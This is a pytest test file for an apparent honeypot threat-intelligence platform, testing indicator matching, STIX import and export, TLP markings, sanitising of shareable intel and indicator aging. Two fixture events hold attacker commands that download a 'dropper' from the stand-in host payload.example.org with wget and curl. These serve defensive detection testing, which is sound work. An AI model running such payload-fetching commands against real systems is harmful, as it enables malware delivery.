import ipaddress
import json

import pytest

from aegis_nexus.app import create_app
import aegis_nexus.threat_context as threat_context_module
from aegis_nexus.cti_stix import export_stix_bundle, import_stix_bundle, indicator_pattern
from aegis_nexus.custom_feed import CustomFeedAdapterError, load_custom_feed_adapter_config
from aegis_nexus.cti_sharing import sanitize_shareable_indicators
from aegis_nexus.model import normalize_event
from aegis_nexus.threat_context import LocalThreatContextEnricher, normalize_indicator
from aegis_nexus.threat_intelligence import ThreatIntelligenceProvider, validate_provider


def _write_feed(path, indicators):
    path.write_text(json.dumps({
        "source": "fixture-feed",
        "generated_at": "2026-09-22T20:00:00Z",
        "indicators": indicators,
    }), encoding="utf-8")


def test_indicator_normalization_is_exact_and_conservative():
    assert normalize_indicator("ip", "8.8.8.8") == ("ip", "8.8.8.8")
    assert normalize_indicator("domain", "Example.ORG.") == ("domain", "example.org")
    assert normalize_indicator("url", "HTTPS://Example.ORG/path?q=1") == ("url", "https://example.org/path?q=1")
    assert normalize_indicator("sha256", "A" * 64) == ("sha256", "a" * 64)
    assert normalize_indicator("sha256", "not-a-hash") is None
    assert normalize_indicator("actor", "anything") is None


def test_local_feed_matches_source_ip_and_observed_artifact_without_changing_severity(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [
        {"type": "ip", "value": "8.8.8.8", "labels": ["scanner"], "confidence": 70},
        {"type": "domain", "value": "payload.example.org", "labels": ["fixture"], "description": "Test context"},
    ])
    enricher = LocalThreatContextEnricher(str(feed))
    event = normalize_event({
        "honeypot": "ssh-1",
        "event_type": "command",
        "severity": "medium",
        "observed": {
            "source_ip": "8.8.8.8",
            "service": "ssh",
            "protocol": "tcp",
            "destination_port": 22,
            "command": "wget https://payload.example.org/dropper -O /tmp/x",
        },
        "derived": {
            "ioc": [{
                "type": "domain",
                "value": "payload.example.org",
                "classification": "observed_artifact",
                "evidence": ["observed.command"],
            }]
        },
    })
    enriched = enricher.enrich(event)

    assert event["enrichment"] == {}
    assert enriched["severity"] == "medium"
    assert "mitre" not in enriched["derived"]
    assert "cve" not in enriched["derived"]
    block = enriched["enrichment"]["threat_context"]
    assert block["provider"] == "local-json"
    assert block["source"] == "fixture-feed"
    assert block["retrieved_at"] == enricher.loaded_at
    assert block["observed_at"]
    assert block["data"]["match_policy"] == "exact"
    matches = block["data"]["matches"]
    assert {(item["type"], item["value"]) for item in matches} == {
        ("ip", "8.8.8.8"),
        ("domain", "payload.example.org"),
    }
    assert any(item["evidence"] == ["observed.source_ip"] for item in matches)
    assert any(item["evidence"] == ["observed.command"] for item in matches)


def test_local_feed_does_not_overwrite_existing_threat_context(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [{"type": "ip", "value": "8.8.8.8"}])
    enricher = LocalThreatContextEnricher(str(feed))
    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "connection",
        "observed": {"source_ip": "8.8.8.8", "service": "http", "protocol": "tcp", "destination_port": 80},
        "enrichment": {
            "threat_context": {
                "source": "upstream-sensor",
                "observed_at": "2026-09-22T19:00:00Z",
                "data": {"classification": "sensor-owned"},
            }
        },
    })
    enriched = enricher.enrich(event)
    assert enriched["enrichment"]["threat_context"]["source"] == "upstream-sensor"


def test_invalid_or_oversized_feed_fails_safe(tmp_path):
    invalid = tmp_path / "invalid.json"
    invalid.write_text("{", encoding="utf-8")
    broken = LocalThreatContextEnricher(str(invalid))
    assert broken.status()["ready"] is False
    assert broken.status()["indicator_keys"] == 0

    large = tmp_path / "large.json"
    large.write_text("X" * 2048, encoding="utf-8")
    bounded = LocalThreatContextEnricher(str(large), max_bytes=1024)
    assert bounded.status()["ready"] is False
    assert bounded.status()["error"] == "feed_too_large"


def test_collector_applies_local_threat_context_and_exposes_status(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [
        {
            "type": "domain",
            "value": "payload.example.org",
            "labels": ["known-in-fixture"],
            "confidence": 80,
            "reference": "https://intel.example.test/indicator/1",
        }
    ])
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "secret",
        "THREAT_CONTEXT_FILE": str(feed),
    })
    client = app.test_client()
    response = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "secret"},
        json={
            "honeypot": "ssh-decoy-01",
            "event_type": "command",
            "severity": "medium",
            "observed": {
                "source_ip": "203.0.113.200",
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": "curl https://payload.example.org/dropper",
            },
        },
    )
    assert response.status_code == 201
    event = client.get(f"/api/v1/events/{response.get_json()['id']}").get_json()
    context = event["enrichment"]["threat_context"]
    assert context["source"] == "fixture-feed"
    assert context["data"]["matches"][0]["value"] == "payload.example.org"
    assert event["severity"] == "medium"
    assert event["derived"].get("mitre") is None
    assert event["derived"].get("cve") is None

    status = client.get("/api/v1/threat-context/status").get_json()
    assert status["ready"] is True
    assert status["provider"] == "local-json"
    assert status["network_requests"] is False
    assert status["indicator_keys"] == 1

    ti = client.get("/api/v1/ips/203.0.113.200/threat-intelligence").get_json()
    assert any(item["kind"] == "threat_context" and item["source"] == "fixture-feed" for item in ti["items"])



def test_local_json_threat_context_implements_provider_contract(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [{"type": "ip", "value": "8.8.8.8"}])
    provider = LocalThreatContextEnricher(str(feed))

    assert isinstance(provider, ThreatIntelligenceProvider)
    assert provider.provider_id == "local-json"
    assert provider.network_requests is False
    validate_provider(provider)
    status = provider.status()
    assert status["ready"] is True
    assert status["network_requests"] is False


def test_threat_intelligence_provider_contract_rejects_missing_identity():
    class InvalidProvider:
        network_requests = False

        def status(self):
            return {}

        def enrich(self, event):
            return event

    with pytest.raises(ValueError, match="provider_id"):
        validate_provider(InvalidProvider())



def test_local_feed_confidence_is_absent_when_source_does_not_supply_it(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [{"type": "ip", "value": "8.8.4.4", "labels": ["fixture"]}])
    provider = LocalThreatContextEnricher(str(feed))
    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "connection",
        "observed": {
            "source_ip": "8.8.4.4",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
        },
    })

    match = provider.enrich(event)["enrichment"]["threat_context"]["data"]["matches"][0]
    assert "confidence" not in match



def test_local_feed_preserves_only_valid_source_supplied_indicator_validity_window(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [{
        "type": "ip",
        "value": "1.1.1.1",
        "valid_from": "2026-09-01T00:00:00Z",
        "valid_until": "2026-10-01T00:00:00+00:00",
    }])
    provider = LocalThreatContextEnricher(str(feed))
    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "connection",
        "observed": {
            "source_ip": "1.1.1.1",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
        },
    })
    match = provider.enrich(event)["enrichment"]["threat_context"]["data"]["matches"][0]
    assert match["valid_from"] == "2026-09-01T00:00:00+00:00"
    assert match["valid_until"] == "2026-10-01T00:00:00+00:00"


def test_local_feed_drops_invalid_or_reversed_validity_window(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [
        {
            "type": "ip",
            "value": "9.9.9.9",
            "valid_from": "2026-10-01T00:00:00Z",
            "valid_until": "2026-09-01T00:00:00Z",
        }
    ])
    provider = LocalThreatContextEnricher(str(feed))
    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "connection",
        "observed": {
            "source_ip": "9.9.9.9",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
        },
    })
    match = provider.enrich(event)["enrichment"]["threat_context"]["data"]["matches"][0]
    assert "valid_from" not in match
    assert "valid_until" not in match



def test_stix_export_maps_supported_indicators_without_inventing_context():
    bundle = export_stix_bundle(
        [
            {"type": "ip", "value": "2001:db8::42", "confidence": 75, "labels": ["scanner"]},
            {"type": "sha256", "value": "a" * 64},
        ],
        source="fixture-feed",
        generated_at="2026-09-22T20:00:00Z",
    )
    assert bundle["type"] == "bundle"
    indicators = [item for item in bundle["objects"] if item.get("type") == "indicator"]
    assert len(indicators) == 2
    ipv6 = next(item for item in indicators if "ipv6-addr" in item["pattern"])
    assert ipv6["spec_version"] == "2.1"
    assert ipv6["confidence"] == 75
    assert ipv6["valid_from"] == "2026-09-22T20:00:00Z"
    sha = next(item for item in indicators if "SHA-256" in item["pattern"])
    assert "confidence" not in sha
    serialized = json.dumps(bundle).lower()
    assert "threat_actor" not in serialized
    assert "attack-pattern" not in serialized
    assert "vulnerability" not in serialized


def test_stix_pattern_distinguishes_ipv4_and_ipv6():
    assert indicator_pattern("ip", "198.51.100.7") == "[ipv4-addr:value = '198.51.100.7']"
    assert indicator_pattern("ip", "2001:db8::7") == "[ipv6-addr:value = '2001:db8::7']"


def test_stix_export_endpoint_is_operator_authenticated_attachment(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [{
        "type": "domain",
        "value": "payload.example.org",
        "confidence": 80,
        "valid_from": "2026-09-01T00:00:00Z",
    }])
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "stix.db"),
        "THREAT_CONTEXT_FILE": str(feed),
        "OPERATOR_API_KEY": "operator-secret",
    })
    client = app.test_client()

    denied = client.get("/api/v1/threat-context/stix")
    assert denied.status_code == 401

    response = client.get(
        "/api/v1/threat-context/stix",
        headers={"X-Aegis-Operator-Key": "operator-secret"},
    )
    assert response.status_code == 200
    assert response.mimetype == "application/stix+json"
    assert response.headers["Content-Disposition"].startswith("attachment;")
    bundle = response.get_json()
    assert bundle["type"] == "bundle"
    indicator = next(item for item in bundle["objects"] if item.get("type") == "indicator")
    assert indicator["pattern"] == "[domain-name:value = 'payload.example.org']"
    assert indicator["confidence"] == 80
    assert len(indicator["object_marking_refs"]) == 2



def test_stix_import_accepts_exact_indicators_and_ignores_non_indicator_objects():
    bundle = {
        "type": "bundle",
        "id": "bundle--11111111-1111-4111-8111-111111111111",
        "objects": [
            {
                "type": "indicator",
                "spec_version": "2.1",
                "id": "indicator--22222222-2222-4222-8222-222222222222",
                "pattern_type": "stix",
                "pattern": "[ipv4-addr:value = '198.51.100.42']",
                "valid_from": "2026-09-01T00:00:00Z",
                "confidence": 65,
            },
            {
                "type": "threat-actor",
                "id": "threat-actor--33333333-3333-4333-8333-333333333333",
                "name": "must-not-be-imported",
            },
            {
                "type": "indicator",
                "id": "indicator--44444444-4444-4444-8444-444444444444",
                "pattern_type": "stix",
                "pattern": "[process:command_line MATCHES '.*']",
                "valid_from": "2026-09-01T00:00:00Z",
            },
        ],
    }
    indicators = import_stix_bundle(bundle)
    assert indicators == [{
        "type": "ip",
        "value": "198.51.100.42",
        "confidence": 65,
        "valid_from": "2026-09-01T00:00:00Z",
    }]


def test_local_provider_can_load_stix_bundle_as_exact_match_context(tmp_path):
    path = tmp_path / "feed.stix.json"
    path.write_text(json.dumps({
        "type": "bundle",
        "id": "bundle--55555555-5555-4555-8555-555555555555",
        "objects": [{
            "type": "indicator",
            "spec_version": "2.1",
            "id": "indicator--66666666-6666-4666-8666-666666666666",
            "pattern_type": "stix",
            "pattern": "[domain-name:value = 'payload.example.org']",
            "valid_from": "2026-09-01T00:00:00Z",
            "confidence": 90,
        }],
    }), encoding="utf-8")
    provider = LocalThreatContextEnricher(str(path))
    assert provider.provider_id == "local-stix"
    assert provider.status()["ready"] is True
    assert provider.status()["source"].startswith("stix-bundle:")

    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "web.payload",
        "observed": {
            "source_ip": "203.0.113.5",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
        },
        "derived": {
            "ioc": [{
                "type": "domain",
                "value": "payload.example.org",
                "classification": "observed_artifact",
                "evidence": ["observed.payload"],
            }]
        },
    })
    match = provider.enrich(event)["enrichment"]["threat_context"]["data"]["matches"][0]
    assert match["value"] == "payload.example.org"
    assert match["confidence"] == 90
    assert "actor" not in match



def test_custom_feed_adapter_maps_nested_vendor_schema_without_inventing_metadata(tmp_path):
    feed = tmp_path / "vendor.json"
    feed.write_text(json.dumps({
        "meta": {"vendor": "example-vendor", "created": "2026-09-25T10:00:00Z"},
        "data": {
            "records": [
                {
                    "indicator": {"kind": "ipv4", "observable": "198.51.100.90"},
                    "assessment": {"score": 72, "tags": ["scanner"]},
                },
                {
                    "indicator": {"kind": "fqdn", "observable": "Payload.Example.ORG"},
                    "assessment": {"tags": ["payload-host"]},
                },
            ]
        },
    }), encoding="utf-8")
    config = {
        "items_path": "data.records",
        "source_path": "meta.vendor",
        "generated_at_path": "meta.created",
        "fields": {
            "type": "indicator.kind",
            "value": "indicator.observable",
            "confidence": "assessment.score",
            "labels": "assessment.tags",
        },
        "type_map": {"ipv4": "ip", "fqdn": "domain"},
    }
    provider = LocalThreatContextEnricher(str(feed), adapter_config=config)
    assert provider.provider_id == "local-custom-json"
    assert provider.status()["ready"] is True
    assert provider.status()["custom_adapter"] is True
    assert provider.status()["source"] == "example-vendor"

    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "web.payload",
        "observed": {
            "source_ip": "198.51.100.90",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
        },
        "derived": {"ioc": [{
            "type": "domain",
            "value": "payload.example.org",
            "classification": "observed_artifact",
            "evidence": ["observed.payload"],
        }]},
    })
    matches = provider.enrich(event)["enrichment"]["threat_context"]["data"]["matches"]
    by_type = {item["type"]: item for item in matches}
    assert by_type["ip"]["confidence"] == 72
    assert "confidence" not in by_type["domain"]
    serialized = json.dumps(matches).lower()
    assert "threat_actor" not in serialized
    assert "mitre" not in serialized
    assert "cve" not in serialized


def test_custom_feed_adapter_supports_fixed_type_and_operator_source(tmp_path):
    feed = tmp_path / "domains.json"
    feed.write_text(json.dumps({"entries": [{"name": "Example.ORG"}]}), encoding="utf-8")
    provider = LocalThreatContextEnricher(str(feed), adapter_config={
        "items_path": "entries",
        "source": "operator-domain-list",
        "fixed_type": "domain",
        "fields": {"value": "name"},
    })
    indicators = provider.indicators()
    assert indicators == [{"type": "domain", "value": "example.org"}]
    assert provider.status()["source"] == "operator-domain-list"


def test_custom_feed_adapter_config_is_bounded_and_mutually_exclusive(tmp_path):
    config_path = tmp_path / "adapter.json"
    config_path.write_text(json.dumps({
        "items_path": "items",
        "fixed_type": "ip",
        "fields": {"value": "address"},
    }), encoding="utf-8")
    loaded = load_custom_feed_adapter_config(file_path=str(config_path))
    assert loaded["fixed_type"] == "ip"

    with pytest.raises(CustomFeedAdapterError, match="configure_only_one"):
        load_custom_feed_adapter_config(raw_json="{}", file_path=str(config_path))

    with pytest.raises(CustomFeedAdapterError, match="adapter_config_too_large"):
        load_custom_feed_adapter_config(raw_json=" " * (16 * 1024 + 1))


def test_custom_feed_adapter_rejects_unknown_config_and_missing_required_mapping():
    with pytest.raises(CustomFeedAdapterError, match="unsupported_adapter_config_key"):
        load_custom_feed_adapter_config(raw_json=json.dumps({
            "items_path": "items",
            "fixed_type": "ip",
            "fields": {"value": "address"},
            "python": "do-not-evaluate",
        }))
    with pytest.raises(CustomFeedAdapterError, match="adapter_value_field_required"):
        load_custom_feed_adapter_config(raw_json=json.dumps({
            "items_path": "items",
            "fixed_type": "ip",
            "fields": {"description": "note"},
        }))


def test_collector_uses_inline_custom_feed_adapter_config(tmp_path):
    feed = tmp_path / "custom.json"
    feed.write_text(json.dumps({
        "rows": [{"category": "address", "observable": "203.0.113.77", "score": 88}]
    }), encoding="utf-8")
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "custom.db"),
        "THREAT_CONTEXT_FILE": str(feed),
        "THREAT_CONTEXT_ADAPTER_JSON": json.dumps({
            "items_path": "rows",
            "source": "fixture-custom",
            "fields": {"type": "category", "value": "observable", "confidence": "score"},
            "type_map": {"address": "ip"},
        }),
    })
    client = app.test_client()
    status = client.get("/api/v1/threat-context/status").get_json()
    assert status["provider"] == "local-custom-json"
    assert status["source"] == "fixture-custom"
    assert status["ready"] is True



@pytest.mark.parametrize("tlp,expected_standard", [
    ("TLP:CLEAR", "TLP:WHITE"),
    ("TLP:GREEN", "TLP:GREEN"),
    ("TLP:AMBER", "TLP:AMBER"),
    ("TLP:AMBER+STRICT", "TLP:AMBER"),
    ("TLP:RED", "TLP:RED"),
])
def test_stix_export_applies_first_tlp_v2_policy_and_stix_compatible_markings(tlp, expected_standard):
    bundle = export_stix_bundle(
        [{"type": "ip", "value": "198.51.100.9"}],
        source="fixture",
        generated_at="2026-09-26T00:00:00Z",
        tlp=tlp,
    )
    markings = [item for item in bundle["objects"] if item.get("type") == "marking-definition"]
    indicator = next(item for item in bundle["objects"] if item.get("type") == "indicator")
    assert len(markings) == 2
    assert expected_standard in {item.get("name") for item in markings}
    statement = next(item for item in markings if item.get("definition_type") == "statement")
    assert tlp in statement["definition"]["statement"]
    assert set(indicator["object_marking_refs"]) == {item["id"] for item in markings}


def test_stix_export_rejects_unknown_tlp_label():
    with pytest.raises(ValueError, match="invalid_tlp_v2_label"):
        export_stix_bundle(
            [{"type": "ip", "value": "198.51.100.9"}],
            source="fixture",
            tlp="TLP:WHITE",
        )


def test_stix_endpoint_fails_closed_on_invalid_configured_tlp(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [{"type": "ip", "value": "198.51.100.10"}])
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "bad-tlp.db"),
        "THREAT_CONTEXT_FILE": str(feed),
        "CTI_EXPORT_TLP": "PUBLIC",
    })
    response = app.test_client().get("/api/v1/threat-context/stix")
    assert response.status_code == 503
    assert response.get_json()["error"] == "invalid_cti_export_tlp"



def test_shareable_cti_sanitizer_drops_internal_networks_secrets_and_non_allowlisted_fields():
    sanitized = sanitize_shareable_indicators(
        [
            {"type": "ip", "value": "172.31.101.44", "description": "management"},
            {
                "type": "domain",
                "value": "public.example.org",
                "description": "contains super-secret-key",
                "labels": ["safe", "super-secret-key"],
                "operator_notes": "must never leave the system",
                "sensor_secret": "super-secret-key",
            },
            {"type": "domain", "value": "super-secret-key.example.org"},
            {"type": "ip", "value": "198.51.100.44", "labels": ["external"]},
        ],
        internal_networks=["172.31.101.0/24"],
        sensitive_values=["super-secret-key"],
    )
    assert sanitized == [
        {"type": "domain", "value": "public.example.org", "labels": ["safe"]},
        {"type": "ip", "value": "198.51.100.44", "labels": ["external"]},
    ]
    serialized = json.dumps(sanitized)
    assert "operator_notes" not in serialized
    assert "sensor_secret" not in serialized
    assert "super-secret-key" not in serialized
    assert "172.31.101.44" not in serialized


def test_stix_api_strips_management_ip_and_deployment_secret_from_shareable_export(tmp_path):
    feed = tmp_path / "shareable.json"
    _write_feed(feed, [
        {"type": "ip", "value": "172.31.101.25", "description": "sensor management"},
        {"type": "ip", "value": "198.51.100.25", "description": "safe external"},
        {"type": "domain", "value": "public.example.org", "description": "token sensor-secret-123"},
    ])
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "shareable.db"),
        "THREAT_CONTEXT_FILE": str(feed),
        "SENSOR_SOURCE_CIDRS": {"ssh-decoy-01": ipaddress.ip_network("172.31.101.0/24")},
        "SENSOR_KEYS": {"ssh-decoy-01": "sensor-secret-123"},
        "OPERATOR_API_KEY": "operator-secret-456",
    })
    response = app.test_client().get(
        "/api/v1/threat-context/stix",
        headers={"X-Aegis-Operator-Key": "operator-secret-456"},
    )
    assert response.status_code == 200
    serialized = response.get_data(as_text=True)
    assert "172.31.101.25" not in serialized
    assert "sensor-secret-123" not in serialized
    assert "198.51.100.25" in serialized
    assert "public.example.org" in serialized



def test_cti_aging_is_derived_without_changing_source_confidence_or_deleting_match(tmp_path, monkeypatch):
    monkeypatch.setattr(threat_context_module, "_now", lambda: "2026-09-26T12:00:00+00:00")
    feed = tmp_path / "aging.json"
    feed.write_text(json.dumps({
        "source": "aging-fixture",
        "generated_at": "2026-01-01T00:00:00Z",
        "indicators": [{
            "type": "ip",
            "value": "198.51.100.60",
            "confidence": 77,
            "last_seen": "2026-06-01T00:00:00Z",
            "valid_until": "2026-07-01T00:00:00Z",
        }],
    }), encoding="utf-8")
    provider = LocalThreatContextEnricher(
        str(feed),
        stale_after_days=30,
        aged_after_days=90,
    )
    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "connection",
        "observed": {
            "source_ip": "198.51.100.60",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
        },
    })
    match = provider.enrich(event)["enrichment"]["threat_context"]["data"]["matches"][0]
    assert match["confidence"] == 77
    assert match["aging"]["basis"] == "last_seen"
    assert match["aging"]["state"] == "aged"
    assert match["aging"]["freshness_score"] == 0
    assert match["aging"]["validity_state"] == "expired"
    assert match["value"] == "198.51.100.60"


def test_cti_aging_stale_score_is_separate_from_source_confidence(tmp_path, monkeypatch):
    monkeypatch.setattr(threat_context_module, "_now", lambda: "2026-09-26T00:00:00+00:00")
    feed = tmp_path / "stale.json"
    _write_feed(feed, [{
        "type": "domain",
        "value": "stale.example.org",
        "confidence": 55,
        "last_seen": "2026-08-07T00:00:00Z",
    }])
    provider = LocalThreatContextEnricher(str(feed), stale_after_days=30, aged_after_days=90)
    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "web.payload",
        "observed": {
            "source_ip": "203.0.113.60",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
        },
        "derived": {"ioc": [{
            "type": "domain",
            "value": "stale.example.org",
            "classification": "observed_artifact",
            "evidence": ["observed.payload"],
        }]},
    })
    match = provider.enrich(event)["enrichment"]["threat_context"]["data"]["matches"][0]
    assert match["confidence"] == 55
    assert match["aging"]["state"] == "stale"
    assert 0 < match["aging"]["freshness_score"] < 100
